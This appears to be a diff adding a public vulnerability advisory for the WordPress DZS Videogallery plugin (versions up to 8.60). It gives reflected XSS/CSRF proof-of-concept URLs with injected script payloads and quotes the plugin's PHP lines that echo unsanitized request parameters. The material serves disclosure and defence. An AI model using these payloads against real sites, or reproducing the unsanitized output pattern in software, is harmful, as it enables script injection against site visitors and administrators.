@@ -1,0 +1,44 @@
+* Exploit Title: Wordpress DZS Videogallery Plugin - Multiple Vulnerabilities <=8.60
+* Discovery Date: 01.05.2016
+* Public Disclosure Date:03.09.2016
+* Vendor Homepage: http://digitalzoomstudio.net/
+* Software Link: http://codecanyon.net/item/video-gallery-wordpress-plugin-w-youtube-vimeo-/157782
+* Exploit Author: Colette Chamberland (Wordfence)
+* Contact: colette@wordfence.com
+* Version: <=8.60
+* Tested on: Wordpress 4.2.x-4.4.x
+* OVE-20160305-2497
+
+
+Technical details:
+
+Unauthenticated CSRF & XSS
+POC:
+http://[target]/wp-content/plugins/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642%27%3balert%281%29%2f%2f645
+Line 13-15 (unsanitized input):
+ if(isset($_GET['initer'])){
+            $initer = $_GET['initer'];
+        }
+Line 27 (unsanitized output):
+       <?php echo "var initer = '" . $initer . "';"; ?>
+---------------------------------------       
+Unauthenticated CSRF &  XSS
+POC:
+http://[target]/wp-content/plugins/dzs-videogallery/admin/tagseditor/popup.php?initer=whatava18642%27%3balert%281%29%2f%2f645
+
+Line 13-15 (unsanitized input):
+ if(isset($_GET['initer'])){
+            $initer = $_GET['initer'];
+        }
+Line 27 (unsanitized output):
+       <?php echo "var initer = '" . $initer . "';"; ?>
+--------------------------------------- 
+Unauthenticated CSRF & XSS:
+POC(s):
+http://[target]/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f"><script>alert(1)<%2fscript>894ba&type=&width=
+http://[target]/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=&type=7934f"><script>alert(1)<%2fscript>99085&width=
+http://[target]/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=&type=&width=54fd7"><script>alert(1)<%2fscript>4708b
+
+Line 25 & 35 (unsanitized input & direct output):
+$w =  $_GET['width'];
+<param name="flashvars" value="video=' . $_GET['source'] . '&types=' . $_GET['type'] . '&defaultQuality=hd" width="' . $w . '" height="' . $h . '">'.$backup.'
